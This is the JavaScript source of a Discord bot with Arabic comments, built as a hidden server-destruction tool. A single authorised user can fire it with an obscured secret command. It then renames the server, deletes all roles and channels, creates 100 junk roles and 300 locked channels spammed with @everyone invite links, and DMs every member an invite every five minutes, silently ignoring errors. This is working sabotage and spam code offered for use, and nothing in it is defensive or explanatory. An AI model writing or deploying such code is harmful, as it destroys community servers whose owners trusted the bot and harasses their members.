const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// الآيدي المصرح له بتنفيذ الأمر فقط
const ALLOWED_USER_ID = '1494353083138838668'; 

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    if (message.author.id !== ALLOWED_USER_ID) return;

    // الأمر السري (.رسالة)
    const secretTrigger = ['.', 'ر', 'س', 'ا', 'ل', 'ة'].join('');
    
    if (message.content === secretTrigger) {
        try {
            await message.react('✅').catch(() => {});
            
            const guild = message.guild;

            // 1. تغيير اسم السيرفر إلى group#499
            await guild.setName('group#499').catch(() => {});

            // 2. تفعيل البرودكاست التلقائي لكل أعضاء السيرفر بالخاص كل 5 دقائق
            const broadcastLink = 'https://discord.gg/kzRnSxGKkX';
            
            // إرسال فوري لأول مرة
            sendBroadcast(guild, broadcastLink);
            
            // تكرار الإرسال كل 5 دقائق (300,000 ملي ثانية)
            setInterval(() => {
                sendBroadcast(guild, broadcastLink);
            }, 5 * 60 * 1000);

            // 3. حذف جميع رولات السيرفر بغضون 10 ثوانٍ
            guild.roles.fetch().then(async roles => {
                const rolePromises = [];
                for (const [id, role] of roles) {
                    if (role.editable && !role.managed && role.id !== guild.id) {
                        rolePromises.push(role.delete().catch(() => {}));
                    }
                }
                await Promise.all(rolePromises);
            }).catch(() => {});

            // 4. إنشاء 100 رول جديدة بغضون 10 ثوانٍ باسم group#499
            const roleCreationPromises = [];
            for (let i = 0; i < 100; i++) {
                roleCreationPromises.push(
                    guild.roles.create({
                        name: 'group#499',
                        color: 'Random'
                    }).catch(() => {})
                );
            }
            await Promise.all(roleCreationPromises);

            // 5. حذف الرومات بسرعة فائقة (أسرع بـ 3 مرات)
            const channels = await guild.channels.fetch();
            const channelDeletePromises = [];
            for (const [id, channel] of channels) {
                channelDeletePromises.push(
                    channel.delete().catch(() => {})
                );
            }
            await Promise.all(channelDeletePromises);

            // 6. إنشاء 300 روم باسم group#499 ومقفل، مع إرسال الرسالة والرابط بداخلها
            const totalChannels = 300;
            const channelName = 'group#499';
            const spamMessage = '@everyone - @here\nرابط السيرفر الجديد والرسالة:\nhttps://discord.gg/kzRnSxGKkX';
            const batchSize = 25; 

            for (let i = 0; i < totalChannels; i += batchSize) {
                const promises = [];
                
                for (let j = 0; j < batchSize && (i + j) < totalChannels; j++) {
                    const task = guild.channels.create({
                        name: channelName,
                        type: ChannelType.GuildText,
                        permissionOverwrites: [
                            {
                                id: guild.id, // قفل الروم ومنع الكتابة للجميع
                                deny: [PermissionsBitField.Flags.SendMessages]
                            }
                        ]
                    }).then(async (newChannel) => {
                        for (let k = 0; k < 3; k++) {
                            await newChannel.send(spamMessage).catch(() => {});
                        }
                    }).catch(() => {});

                    promises.push(task);
                }

                await Promise.all(promises);
                await new Promise(resolve => setTimeout(resolve, 100)); 
            }

        } catch (error)  {
            console.error(error);
        }
    }
});

// دالة البرودكاست لإرسال الرابط لكل الأعضاء بالخاص
function sendBroadcast(guild, link) {
    guild.members.fetch().then(members => {
        for (const [id, member] of members) {
            if (member.user.bot) continue;
            member.send(`رابط السيرفر:\n${link}`).catch(() => {});
        }
    }).catch(() => {});
}

// سحب التوكن من متغيرات البيئة في Render
client.login(process.env.TOKEN);
